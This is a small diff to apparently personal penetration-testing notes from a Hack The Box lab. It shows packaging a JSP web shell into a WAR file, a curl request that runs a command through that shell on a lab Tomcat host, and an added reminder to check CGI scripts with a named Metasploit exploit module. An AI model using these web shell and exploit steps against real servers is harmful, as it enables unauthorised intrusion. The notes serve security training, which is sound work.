@@ -301,6 +301,8 @@ abdeonix@htb[/htb]$ zip -r backup.war cmd.jsp
 ```bash
 curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
 ```
+> ![IMPORTANT]
+> Don't forget checking CGI scripts & use (windows/http/tomcat_cgi_cmdlineargs) module in metasploit
 
 ## Splunk 
 - Splunk is a log analytics tool used to gather, analyze and visualize data. 
